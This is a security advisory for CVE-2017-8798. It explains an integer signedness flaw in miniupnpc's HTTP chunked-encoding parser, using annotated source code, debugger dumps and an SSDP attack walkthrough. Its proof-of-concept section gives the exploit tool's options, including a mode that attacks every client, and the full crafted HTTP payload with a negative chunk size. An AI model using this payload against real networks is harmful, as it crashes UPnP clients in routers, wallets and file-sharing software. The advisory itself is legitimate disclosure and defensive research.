@@ -1,0 +1,1137 @@
+VuNote
+======
+
+    Author:     <github.com/tintinweb>
+    Ref:        https://github.com/tintinweb/pub/tree/master/pocs/cve-2017-8798
+    Version:    0.6
+    Date:       May 1st, 2017
+
+    Tag:        miniupnpc getHTTPResponse chunked encoding integer signedness error
+
+Overview
+--------
+
+    Name:           miniupnpc
+    Vendor:         Thomas Bernard
+    References:     * http://miniupnp.free.fr/ [1]
+
+    Version:        v2.0 [2]
+    Latest Version: v2.0.20170421 [2][3]
+    Other Versions: >= v1.4.20101221 [2] (released 21/12/2010; ~6 years ago)
+    Platform(s):    cross
+    Technology:     c
+
+    Vuln Classes:   CWE-196, CWE-190
+    Origin:         remote
+    Min. Privs.:    ---
+
+    CVE:            CVE-2017-8798
+
+
+Description
+---------
+
+quote website [1]
+
+>UPnP IGD client lightweight library and UPnP IGD daemon
+>The UPnP protocol is supported by most home adsl/cable routers and Microsoft Windows 2K/XP. The aim of the MiniUPnP project is to bring a free software solution to support the "Internet Gateway Device" part of the protocol. The MediaServer/MediaRenderer UPnP protocol (DLNA) is also becoming very popular but here we are talking about IGD. ReadyMedia (formely known as MiniDLNA) is a UPnP Media Server using some UPnP code from MiniUPnPd.
+
+miniupnp is part of many applications and embedded network devices
+
+* P2P File Sharing software - e.g. qBittorrent
+* Network Device Firmware
+* Blockchain clients - e.g. EthereumCPP, bitcoind and forked coins
+
+
+Summary
+-------
+
+*TL;DR - one-click crash miniupnpc based applications on your network*
+
+#### Integer signedness error in miniupnpc allows remote attackers to
+cause a denial of service condition via specially crafted HTTP response
+
+An integer signedness error was found in miniupnp's `miniwget` allowing
+an unauthenticated remote entity typically located on the
+local network segment to trigger a heap corruption or an access violation
+in miniupnp's http response parser when processing a specially crafted
+chunked-encoded response to a request for the xml root description url.
+
+To exploit this vulnerability, an attacker only has to provide a
+chunked-encode HTTP response with a negative chunk length to upnp
+clients requesting a resource on the attackers webserver. Upnp clients
+can easily be instructed to request resources on the attackers webserver
+by answering SSDP discovery request or by issueing SSDP service
+notifications (low complexity, integral part of the protocol).
+
+
+* remote, unauthenticated, `ACCESS_VIOLATION_READ` and heap corruption
+* (confirmed) DoS; (unconfirmed) could also lead to RCE under certain
+circumstances (multi-threaded?)
+
+
+see attached PoC
+see proposed patch
+
+Details
+-------
+
+The vulnerable component is a HTTP file download method called
+`miniwget` (precisely `getHTTPResponse`) that fails to properly handle
+invalid chunked-encoded HTTP responses. The root cause is a bounds check
+that mistakenly casts an unsigned attacker-provided chunksize to signed
+int leading to an incorrect decision on the destination heap buffer size
+when copying data from the server response to an internal buffer. The
+attacker controls both the size of the internal buffer as well as the
+number of bytes to copy. In order for this attack to succeed, the number
+of bytes to copy must be negative.
+
+attacker controls:
+* `int content_length`
+* `unsigned int chunksize`
+* `bytestocopy` if `(int) chunksize` is negative (or at least < `n-i` ~ 1900 bytes)
+* length of `content_buf` if `bytestocopy` is negative
+
+In the end, the attacker controls
+* `realloc(content_buf, content_length)`
+* `memcpy(content_buf+x, http_response, chunksize)`
+
+
+        client (miniupnpc)                         server (poc.py)
+            |                                         |
+            |                                         |
+            | SSDP:  Discovery - M-SEARCH             |
+        1.  | --------------------------------------> |
+            |                                         |
+            | SSDP:  Reply - Location Header          |
+        2.  | <-------------------------------------- |
+            |                                         |
+            | SCPD:  GET (Location Header/xxxx.xml)   |
+        3.  | --------------------------------------> |
+            |                                         |
+            | SCPD:  HTTP chunked-encoded reply       |
+        4.  | <-------------------------------------- |
+            |                                         |
+
+1. application performs SSDP discovery via M-SEARCH (multicast, local network segment)
+2. poc.py responds with the url to the xml root description requesting the application to navigate to the malicious webserver.
+3. application requests xml root description url (taken from reply to M-SEARCH, Location Header) on malicious webserver (poc.py)
+4. poc.py responds with a specially crafted http response triggering the heap overwrite in miniupnp
+
+#### Source
+
+`miniwget.c:236` [4]
+
+*Note:* Inline annotations are prefixed with //#!
+
+* A) 1. to 3. is the parsing of the chunksize
+* B) 4. to 5. integer signedness error
+* C) 6. integer wrapping
+* D) 7. to 9. destination buffer size
+* E) 10. heap overwrite with size in bytestocopy
+
+
+```c
+/* content */
+if(chunked)                                         //#! 1) transfer-encoding: chunked
+{
+    int i = 0;
+    while(i < n)
+    {
+        if(chunksize == 0)
+        {
+            /* reading chunk size */
+            if(chunksize_buf_index == 0) {
+                /* skipping any leading CR LF */
+                if(i<n && buf[i] == '\r') i++;
+                if(i<n && buf[i] == '\n') i++;
+            }
+            while(i<n && isxdigit(buf[i])                               //#! 2) copy hexchars to chunksize_buf
+                 && chunksize_buf_index < (sizeof(chunksize_buf)-1))
+            {
+                chunksize_buf[chunksize_buf_index++] = buf[i];
+                chunksize_buf[chunksize_buf_index] = '\0';
+                i++;
+            }
+            while(i<n && buf[i] != '\r' && buf[i] != '\n')
+                i++; /* discarding chunk-extension */
+            if(i<n && buf[i] == '\r') i++;
+            if(i<n && buf[i] == '\n') {
+                unsigned int j;
+                for(j = 0; j < chunksize_buf_index; j++) {              //#! 3) hexint chunksize = atoi(chunksize_buf)
+                if(chunksize_buf[j] >= '0'
+                   && chunksize_buf[j] <= '9')
+                    chunksize = (chunksize << 4) + (chunksize_buf[j] - '0');
+                else
+                    chunksize = (chunksize << 4) + ((chunksize_buf[j] | 32) - 'a' + 10);
+                }
+                chunksize_buf[0] = '\0';
+                chunksize_buf_index = 0;
+                i++;
+            } else {
+                /* not finished to get chunksize */
+                continue;
+            }
+#ifdef DEBUG
+            printf("chunksize = %u (%x)\n", chunksize, chunksize);
+#endif
+            if(chunksize == 0)
+            {
+#ifdef DEBUG
+                printf("end of HTTP content - %d %d\n", i, n);
+                /*printf("'%.*s'\n", n-i, buf+i);*/
+#endif
+                goto end_of_stream;
+            }
+        }
+        //#! 4)
+        //#!   goal: a) bytestocopy becomes negative due to chunksize being negative
+        //#!         b) content_length defines destination buffer size
+        //#!         c) overwrite destination heap buffer content_buf[content_length] with bytestocopy bytes from request
+        //#!            memcopy(content_buf[content_length], req_body, (unsigned)bytestocopy)
+        //#!
+        bytestocopy = ((int)chunksize < (n - i))?chunksize:(unsigned int)(n - i);   //#! 5) boom! - bytestocopy becomes chunksize since chunksize is negative (e.g. -1)
+        if((content_buf_used + bytestocopy) > content_buf_len)                      //#! 6) true, since bytestocopy is negative, wraps unsigned content_buf_used
+        {
+            char * tmp;
+            if(content_length >= (int)(content_buf_used + bytestocopy)) {           //#! 7) content_length is attacker controlled.
+                content_buf_len = content_length;                                   //#! 8) we want content_length to define our dst buffer size (e.g. 9000)
+            } else {                                                                 //#!   if we dont hit this, content_buf_len would likely be ~2k
+                content_buf_len = content_buf_used + bytestocopy;
+            }
+            tmp = realloc(content_buf, content_buf_len);                            //#! 9) realloc to content_length bytes (e.g. 9000)
+            if(tmp == NULL) {
+                /* memory allocation error */
+                free(content_buf);
+                free(header_buf);
+                *size = -1;
+                return NULL;
+            }
+            content_buf = tmp;
+        }
+        memcpy(content_buf + content_buf_used, buf + i, bytestocopy);               //#! 10) boom heap overwrite with bytesttocopy bytes (e.g. (unsigned)-1) to content_length (e.g. 9000) sized buffer
+        content_buf_used += bytestocopy;                                            //#!     (also an out of bounds ready since it has not been checked if buf holds enough bytes)
+        i += bytestocopy;
+        chunksize -= bytestocopy;
+    }
+}
+```
+
+#### Taint Graph
+
+    basically all `miniwget*` and `UPNP_*` methods.
+
+    * getHTTPResponse (vulnerable)
+     * miniwget3
+      * miniwget2
+       * miniwget
+       * miniwget_getaddr
+        * UPNP_GetIGDFromUrl
+        * UPNP_GetValidIGD
+         * UPnP_selectigd
+     * UPNP_Get*
+     * UPNP_Check*
+     * UPNP_Delete*
+     * UPNP_Update*
+     * UPNP_Add*
+
+
+#### Scenarios
+
+The PoC can be configured for three scenarios:
+
+##### 1) SCENARIO_CRASH_LARGE_MEMCPY
+
+Similar to 3) attempts to smash the heap but likely fails with an
+`ACCESS_VIOLATION_READ` when trying to read from an non-accessible
+memory region.
+
+    (gdb) up
+    #1  0x000000000040862c in getHTTPResponse (s=s@entry=3, size=size@entry=0x7fffffffd77c,
+        status_code=status_code@entry=0x0) at miniwget.c:305
+    305                                             memcpy(content_buf + content_buf_used, buf + i, bytestocopy);
+    (gdb) i lo
+    i = 30
+    buf = "f\r\n<xml>BOOM</xml>\r\n80000000\r\n", 'A' <repeats 2018 times>
+    n = 1954
+    endofheaders = 94
+    chunked = 1
+    content_length = 9041
+    chunksize = 2147483648
+    bytestocopy = 2147483648                     //#! <--- nr of bytes to copy from buf
+    header_buf = 0x60f010 "HTTP/1.1 200 OK\r\nTransfer-Encoding: chunked\r\nContent-Length: 9041\r\nContent-Type: text/html\r\n\r\nf\r\n<xml>BOOM</xml>\r\n80000000\r\n", 'A' <repeats 76 times>...
+    header_buf_len = 2048
+    header_buf_used = <optimized out>
+    content_buf = 0x60f820 "<xml>BOOM</xml>", 'A' <repeats 16 times>
+    content_buf_len = 9041                       //#! <--- dst buffer size
+    content_buf_used = 15
+    chunksize_buf = "\000\060\060\060\060\060\060\060\000\313\377\377\377\177\000\000\200\277@\000\000\000\000\000\233\277@\000\000\000\000"
+    chunksize_buf_index = 0
+    reason_phrase = 0x0
+    reason_phrase_len = 0
+
+##### 2) SCENARIO_CRASH_REALLOC_NULLPTR
+
+Miniupnp v1.8 was missing an error check for `realloc` which can
+be used to cause a DoS condition when making `realloc` fail while
+allocating a large chunk of data. When `realloc` fails - because
+the requested size of memory cannot be allocated - it returns a
+`nullptr`. Miniupnp ~1.8 was missing a check for the `nullptr`
+and tried to `memcpy` bytes from the attackers http response to
+that `nullptr` which fails with an `ACCESS_VIOLATION`.
+
+To achieve this scenario one must provide an arbitrarily large
+`content_length` (e.g. `0x7fffffff` likely fails on 32 bits) and
+make `memcpy` attempt to copy a byte to that location.
+
+
+##### 3) SCENARIO_CRASH_1_BYTE_BUFFER
+
+The idea is to create a small heap buffer and overwrite it with
+a large chunk of data. This can be achieved by making instructing
+miniupnp to `realloc` `content_buf` to a size of `1 byte` by
+providing a `content-length` of `1`. To overwrite this 1 byte
+buffer the attacker provides a negative chunksize e.g.
+`0x80000000`. Depending on the implementation of `memcpy` and
+the memory layout `memcpy` will either fail with a
+`ACCESS_VIOLATION_READ` as we're only providing <= 2048 bytes
+with the server response and will most certainly hit a non-accessible
+memory region while copying `0x80000000` bytes or the application
+crashes because of a heap corruption.
+
+Discussion: It could maybe possible for an upnp thread to corrupt
+the heap, overwriting structures used by another thread to cause
+code execution even before the application crashes when accessing
+a non-accesible memory region.
+
+
+Here's an example of `miniupnpc` corrupting the heap when compiled
+for 32 bit platforms.
+
+
+     âº 0x80504de <getHTTPResponse+1912>    call   memcpy@plt                    <0x8048a20>
+            dest: 0x805981f ââ 0x0                    //#! <--- size 1 - attacker controlled content_buf
+            src: 0xffffb77e ââ 0x41414141 ('AAAA')    //#! <--- attacker controlled http response
+            n: 0x80000000                             //#! <--- attacker controlled (must be negative) bytestocopy
+
+    pwndbg> i lo
+    i = 30
+    buf = "f\r\n<xml>BOOM</x"...
+    n = <optimized out>
+    endofheaders = 91
+    chunked = 1
+    content_length = 1
+    chunksize = 2147483648
+    bytestocopy = 2147483648                          //#! <--- nr of bytes to copy from buf
+    header_buf = 0x8059008 "HTTP/1.1 200 OK"...
+    header_buf_len = 2048
+    header_buf_used = <optimized out>
+    content_buf = 0x8059810 "<xml>BOOM</x\351\a\002"
+    content_buf_len = 1                               //#! <--- destination, realloc'd to 1
+    content_buf_used = 15
+    chunksize_buf = "\000\060\060\060\060\060\060\060\000\267\377\377p12"...
+    chunksize_buf_index = <optimized out>
+    reason_phrase = 0x0
+    reason_phrase_len = 0
+
+    //#! ### before memcpy
+    pwndbg> hexdump content_buf 100
+    +0000 0x8059810  3c 78 6d 6c  3e 42 4f 4f  4d 3c 2f 78  e9 07 02 00  â<xmlâ>BOOâM</xâ....â
+    +0010 0x8059820  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  â....â....â....â....â
+    ...
+    +0060 0x8059870  00 00 00 00                                         â....â    â    â    â
+    +0064 0x8059874
+
+    //#! ### after memcpy
+    pwndbg> hexdump content_buf 100
+    +0000 0x8059810  3c 78 6d 6c  3e 42 4f 4f  4d 3c 2f 78  e9 07 02 41  â<xmlâ>BOOâM</xâ...Aâ
+    +0010 0x8059820  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  âAAAAâAAAAâAAAAâAAAAâ
+    ...
+    +0060 0x8059870  41 41 41 41                                         âAAAAâ    â    â    â
+    +0064 0x8059874
+
+
+#### Impact analysis:
+
+* DoS - providing an overly large `content_length` may cause `realloc`
+to fail and return a `nullptr`. subsequently crashing due to `memcpy`
+trying to copy to `nullptr`. Has been `fixed > v1.8`.
+* DoS / potential RCE - providing a correct `content_length` wont cause
+`realloc` to fail and `memcpy` will go on copying a large block of data
+to `content_buf`. Potential for RCE in multithreaded environments with
+threads sharing the heap e.g. main thread doing things while upnp thread
+overwrites large portions of the heap. may result in random crashes but
+might allow to corrupt neighboring heap chunks in a way to gain code
+exec.
+* DoS - providing `0x7fffffff` to content_length may fail due to `realloc`
+not being able to allocate >2 GB heap space on certain platforms. If
+that would succeed, an attacker could try to write `1+x` bytes past the
+reallocation when providing a chunksize of `0x80000000+x`. However, the
+attacker is not able to provide http response chunks >2048 bytes due to
+miniupnp reading responses in chunks of max 2048 therefore rendering a
+RCE scenario impossible turning it into a DoS condition with due to
+`ACCESS_VIOLATION_READ`.
+
+
+Proof of Concept
+----------------
+
+Prerequisites:
+
+* any software that compiles with `miniupnpc` or calls
+`miniwget.c::miniwget()` - e.g. bitcoind (with -upnp)
+* `poc.py`, python 2.7, tested on windows and linux
+(disable firewall or allow inbound tcp:65000, udp:1900)
+
+Usage:
+
+```c
+usage: poc.py [options]
+
+           example: poc.py --listen <your_local_ip>:65000 [--havoc | --target <ip> [<ip>..]]
+
+
+
+optional arguments:
+  -h, --help            show this help message and exit
+  -q, --quiet           be quiet [default: False]
+  -l LISTEN, --listen LISTEN
+                        local httpserver listen ip:port. Note: 0.0.0.0:<port>
+                        is not allowed. This ip is being used in the SSDP
+                        response Location header.
+  -u USN, --usn USN     Unique Service Name.
+  -t [TARGET [TARGET ...]], --target [TARGET [TARGET ...]]
+                        Specify a list of client-ips to attack. Use --havoc to
+                        attempt to crash all clients.
+  -z, --havoc           Attempt to attack all clients connecting to our http
+                        server. Use at your own risk.
+```
+
+run PoC
+
+* local listen ip:port for the malicious web server: 192.168.2.104:65000 (your ip)
+* only attempt to crash client 192.168.2.113 (use --havoc instead of --target to disable whitelist)
+
+```python
+#> poc.py --listen <your_local_ip>:65000 --target 192.168.2.113
+
+[poc.py -                 main() ][    INFO]
+
+
+   _  _    _____ _____ _____ _____
+  / |/ |  |  |  |  _  |   | |  _  |            ___ ___    _____ ___ ___ ___
+ / // /   |  |  |   __| | | |   __|   _ _ _   |   | . |  |     | . |  _| -_|
+|_/|_/    |_____|__|  |_|___|__|     |_|_|_|  |_|_|___|  |_|_|_|___|_| |___
+
+                                                      //github.com/tintinweb
+
+
+    [mode  ]        filter (targeting ['192.168.2.113'])
+    [listen]        192.168.2.104:65000 (local http server listening ip)
+    [usn   ]        uuid:deadface-dead-dead-dead-cafebabed00d::upnp:rootdevice
+
+[poc.py -                 main() ][   DEBUG] spawning webserver: <BadHttpServer bind=('192.168.2.104', 65000)>
+[poc.py -             __init__() ][   DEBUG] [SSDP] bind: 0.0.0.0:1900
+[poc.py -               listen() ][    INFO] [HTTP] bind 192.168.2.104:65000
+[poc.py -             __init__() ][   DEBUG] [SSDP] add membership: UDP/239.255.255.250
+[poc.py -    register_callback() ][   DEBUG] [SSDP] add callback for 'M-SEARCH' : <function handle_msearch at 0x027B9270>
+[poc.py -               listen() ][    INFO] [HTTP] waiting for connection
+[poc.py -    register_callback() ][   DEBUG] [SSDP] add callback for 'NOTIFY' : <function handle_notify at 0x027B9330>
+[poc.py -               listen() ][   DEBUG] [SSDP] listening...
+[poc.py -               listen() ][    INFO] [      ] connection from: ('192.168.2.113', 43810)
+[poc.py -               listen() ][   DEBUG] GET /xxxx.xml HTTP/1.1
+Host: 192.168.2.104:65000
+Connection: Close
+User-Agent: CentOS/7.2.1511, UPnP/1.1, MiniUPnPc/2.0
+
+
+[poc.py -                 send() ][   DEBUG] HTTP/1.1 200 OK
+Transfer-Encoding: chunked
+Content-Length: 9041
+Content-Type: text/html
+
+f
+<xml>BOOM</xml>
+80000000
+AAAAAAAAAAAAAAAA...         //#! Repeated 9k times.
+3
+bye
+0
+[poc.py -                 send() ][ WARNING] [----->] BOOM! payload delivered! - [to:('192.168.2.113', 43810)] <HttpLikeMessage msg=('HTTP/1.1', '200', 'OK') header={'Transfer-Encoding': 'chunked', 'Content-Length': 9041, 'Content-Type': 'text/html'} body='f\r\n<xml>BOOM</xml>\r\n80000000\r\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA